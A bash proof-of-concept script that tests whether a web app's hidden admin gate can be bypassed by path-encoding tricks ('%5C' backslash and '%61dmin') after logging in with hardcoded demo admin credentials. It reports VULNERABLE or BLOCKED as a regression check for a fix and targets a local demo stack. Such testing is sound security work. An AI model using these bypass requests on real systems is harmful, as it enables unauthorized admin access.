#!/usr/bin/env bash
# PoC: hidden admin gate bypass and admin API access.
#
# Before the fix this script exits 1 and prints VULNERABLE. After the fix it
# exits 0 and prints BLOCKED. It never prints cookies or response bodies.
#
# Usage:
#   BASE_URL=http://localhost:3000 \
#   ADMIN_EMAIL=admin@azahar.example \
#   ADMIN_PASSWORD=... ./scripts/poc-gate-bypass.sh
#
# The defaults are the documented demo credentials. Use them only against the
# local demo stack.
set -euo pipefail

BASE="${BASE_URL:-http://localhost:3000}"
EMAIL="${ADMIN_EMAIL:-admin@azahar.example}"
PASSWORD="${ADMIN_PASSWORD:-azahar-dev-admin-2026}"
JAR="$(mktemp)"
trap 'rm -f "$JAR"' EXIT

login_code="$(curl -s -c "$JAR" -o /dev/null -w '%{http_code}' \
	-X POST "$BASE/api/auth/login" \
	-H 'Content-Type: application/json' \
	-H 'X-Requested-With: azahar-web' \
	-H "Origin: $BASE" \
	--data "{\"email\":\"$EMAIL\",\"password\":\"$PASSWORD\"}")"

if [[ "$login_code" != "200" ]]; then
	echo "login returned $login_code; not signed in (rate limit or bad credentials)." >&2
	exit 2
fi

normal_admin="$(curl -s -b "$JAR" -o /dev/null -w '%{http_code}' "$BASE/api/admin/metrics")"
bypass_admin="$(curl -s -b "$JAR" -o /dev/null -w '%{http_code}' "$BASE/api/admin%5Cmetrics")"
encoded_ui="$(curl -s -o /dev/null -w '%{http_code}' "$BASE/%61dmin/login")"
gated_ui="$(curl -s -o /dev/null -w '%{http_code}' "$BASE/admin/login")"

printf 'normal /api/admin/metrics      %s (expected 404 with the gate)\n' "$normal_admin"
printf 'bypass /api/admin%%5Cmetrics    %s (expected 404 after the fix)\n' "$bypass_admin"
printf 'encoded /%%61dmin/login        %s (expected 404 after the fix)\n' "$encoded_ui"
printf 'plain /admin/login             %s (expected 404 without the gate)\n' "$gated_ui"

if [[ "$normal_admin" == "404" && "$bypass_admin" == "200" && "$encoded_ui" == "200" && "$gated_ui" == "404" ]]; then
	echo "VULNERABLE: an admin session can use the admin API without the gate cookie."
	exit 1
fi

if [[ "$normal_admin" == "404" && "$bypass_admin" == "404" && "$encoded_ui" == "404" && "$gated_ui" == "404" ]]; then
	echo "BLOCKED: the admin gate is enforced on normalized paths."
	exit 0
fi

echo "UNEXPECTED: the stack did not match either the vulnerable or the fixed state." >&2
exit 2
